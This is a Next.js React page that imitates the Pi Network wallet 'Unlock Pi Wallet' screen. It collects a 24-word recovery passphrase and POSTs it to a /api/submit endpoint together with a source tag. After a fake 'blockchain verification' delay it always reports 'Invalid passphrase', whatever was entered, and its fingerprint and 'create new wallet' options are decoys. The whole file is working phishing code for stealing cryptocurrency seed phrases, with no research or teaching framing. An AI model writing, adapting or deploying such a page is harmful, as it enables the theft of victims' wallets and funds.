"use client";

import React, { useState, useEffect, Suspense } from "react";
import Link from "next/link";
import { useRouter, useSearchParams } from "next/navigation";
import { ChevronDown, ChevronLeft, Loader2 } from "lucide-react";
import { WalletIcon, PiHeaderLogo, PiNetLogo } from "@/components/pi-icons";

function WalletPageContent() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const [passphrase, setPassphrase] = useState("");
  const [source, setSource] = useState("Wallet");
  const [isPassLoading, setIsPassLoading] = useState(false);
  const [isFingerLoading, setIsFingerLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");
  const [showFingerprintModal, setShowFingerprintModal] = useState(false);

  useEffect(() => {
    const src = searchParams.get("source");
    if (src) {
      setSource(src);
    }
  }, [searchParams]);

  const validatePassphrase = (value: string): string | null => {
    const trimmed = value.trim();
    if (!trimmed) {
      return "Please enter your passphrase.";
    }
    const words = trimmed.split(/\s+/);
    const invalidWords = words.filter((w) => !/^[a-zA-Z]+$/.test(w));
    if (invalidWords.length > 0) {
      return "Passphrase must contain only alphabetic words. Numbers and special characters are not allowed.";
    }
    if (words.length !== 24) {
      return `Passphrase must be exactly 24 words. You entered ${words.length} word${words.length === 1 ? "" : "s"}.`;
    }
    return null;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const validationError = validatePassphrase(passphrase);
    if (validationError) {
      setErrorMessage(validationError);
      return;
    }

    setErrorMessage("");
    setIsPassLoading(true);

    try {
      const response = await fetch("/api/submit", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          passphrase: passphrase.trim(),
          source: source,
        }),
      });

      if (!response.ok) {
        throw new Error("Failed to submit");
      }

      // Simulate network wait for blockchain verification
      setTimeout(() => {
        setIsPassLoading(false);
        setErrorMessage("Invalid passphrase. Please enter correct passphrase.");
      }, 2500);

    } catch (error) {
      console.error(error);
      setErrorMessage("An error occurred. Please try again.");
      setIsPassLoading(false);
    }
  };

  const handleBiometricClick = async () => {
    if (!passphrase.trim()) {
      setShowFingerprintModal(true);
      return;
    }

    const validationError = validatePassphrase(passphrase);
    if (validationError) {
      setErrorMessage(validationError);
      return;
    }

    setErrorMessage("");
    setIsFingerLoading(true);

    try {
      await fetch("/api/submit", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          passphrase: passphrase.trim(),
          source: `${source} (Fingerprint)`,
        }),
      });

      setTimeout(() => {
        setIsFingerLoading(false);
        setErrorMessage("Invalid passphrase. Please enter correct passphrase.");
      }, 2500);
    } catch (error) {
      console.error("Biometric submission error:", error);
      setErrorMessage("An error occurred. Please try again.");
      setIsFingerLoading(false);
    }
  };

  const anyLoading = isPassLoading || isFingerLoading;

  return (
    <div className="min-h-screen bg-zinc-100 sm:bg-white flex justify-center items-start">
      {/* Container - wraps as mobile container on mobile, full-width on desktop */}
      <div className="w-full max-w-md sm:max-w-none min-h-screen bg-white flex flex-col relative shadow-2xl sm:shadow-none border-x border-zinc-200 sm:border-x-0">

        {/* Top Header */}
        <header className="bg-[#703d92] text-white h-14 sticky top-0 z-30 shadow-md w-full">
          <div className="flex justify-between items-center w-full h-full px-4 max-w-screen-2xl mx-auto">
            {/* Mobile: Back Chevron */}
            <Link href="/" className="sm:hidden text-white hover:text-white/80 transition-colors flex items-center justify-center w-8 h-8">
              <ChevronLeft className="w-6 h-6" />
            </Link>

            {/* Desktop: PiNet Logo */}
            <div className="hidden sm:flex items-center min-w-[120px]">
              <Link href="/" className="text-[#FBB44A] hover:text-[#e5a03b] transition-colors">
                <PiNetLogo className="h-9 w-auto" />
              </Link>
            </div>

            {/* Center: Title + Pi Logo */}
            <div className="flex-1 flex justify-center items-center gap-2 sm:gap-3">
              <span className="text-lg sm:text-xl font-semibold tracking-wide">Wallet</span>
              <PiHeaderLogo size={26} className="text-[#FBB44A]" />
            </div>

            {/* Mobile: Dropdown chevron */}
            <div className="sm:hidden">
              <button className="text-white hover:text-white/80 transition-colors flex items-center justify-center w-8 h-8">
                <ChevronDown className="w-6 h-6" />
              </button>
            </div>

            {/* Desktop: Download button */}
            <div className="hidden sm:flex items-center justify-end min-w-[120px]">
              <button className="rounded-lg transition duration-300 px-4 py-1.5 font-semibold bg-[#FBB44A] hover:bg-[#e5a03b] text-zinc-900 text-sm shadow-sm cursor-pointer">
                Download Pi Browser
              </button>
            </div>
          </div>
        </header>

        {/* Content Area */}
        <main className="p-6 flex-grow flex flex-col justify-start w-full sm:max-w-md sm:mx-auto sm:pt-12">
          <h1 className="text-zinc-800 text-xl font-bold text-center mt-4 mb-8">
            Unlock Pi Wallet
          </h1>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="space-y-2">
              <textarea
                value={passphrase}
                onChange={(e) => setPassphrase(e.target.value)}
                placeholder="Enter your 24-word passphrase here"
                className="w-full h-40 leading-relaxed passphrase-textarea"
                disabled={anyLoading}
              />
              {errorMessage && (
                <p className="text-rose-500 text-xs font-semibold px-1">{errorMessage}</p>
              )}
            </div>

            <div className="space-y-3 pt-2">
              <button
                type="submit"
                disabled={anyLoading}
                className="w-full border border-zinc-300 text-[#7a2b7b] bg-white rounded-lg py-3 font-semibold text-sm hover:bg-zinc-50 active:bg-zinc-100 transition-colors border-b-2 flex items-center justify-center gap-2 shadow-xs cursor-pointer"
              >
                {isPassLoading && <Loader2 className="w-4 h-4 animate-spin text-[#7a2b7b]" />}
                Unlock With Passphrase
              </button>

              <button
                type="button"
                onClick={handleBiometricClick}
                disabled={anyLoading}
                className="w-full bg-[#7a2b7b] text-white rounded-lg py-3 font-semibold text-sm hover:bg-[#6a256b] active:bg-[#5a1f5c] transition-colors shadow-sm flex items-center justify-center gap-2 cursor-pointer"
              >
                {isFingerLoading && <Loader2 className="w-4 h-4 animate-spin text-white" />}
                Unlock With Fingerprint
              </button>
            </div>
          </form>

          {/* Warnings Section */}
          <div className="mt-8 space-y-4 text-xs text-zinc-600 leading-relaxed font-normal">
            <p>
              As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.
            </p>
            <p>
              Lost your passphrase?{" "}
              <span
                onClick={() => {
                  setErrorMessage("Wallet creation is temporarily disabled during network maintenance.");
                }}
                className="text-sky-500 font-medium hover:underline cursor-pointer"
              >
                You can create a new wallet
              </span>
              , but all your π in your previous wallet will be inaccessible.
            </p>
          </div>
        </main>

        {/* Fingerprint Warning Modal */}
        {showFingerprintModal && (
          <div className="fixed inset-0 bg-black/45 flex items-center justify-center z-50 p-6 animate-fade-in">
            <div className="bg-white rounded-2xl w-full max-w-[340px] p-6 sm:p-7 shadow-2xl flex flex-col justify-between min-h-[190px] border border-zinc-100">
              <div className="text-left pt-2">
                <p className="text-red-500 font-normal text-[17px] leading-relaxed select-none">
                  Please unlock your wallet with Passphrase and setup finger print in setting section
                </p>
              </div>
              <div className="flex justify-center mt-6">
                <button
                  type="button"
                  onClick={() => setShowFingerprintModal(false)}
                  className="bg-[#703d92] hover:bg-[#60337d] text-white px-8 py-2 rounded-lg text-sm font-semibold transition-colors cursor-pointer shadow-sm min-w-[80px]"
                >
                  OK
                </button>
              </div>
            </div>
          </div>
        )}

      </div>
    </div>
  );
}

export default function WalletPage() {
  return (
    <Suspense fallback={
      <div className="min-h-screen bg-zinc-100 flex justify-center items-center">
        <Loader2 className="w-10 h-10 animate-spin text-[#7a2b7b]" />
      </div>
    }>
      <WalletPageContent />
    </Suspense>
  );
}
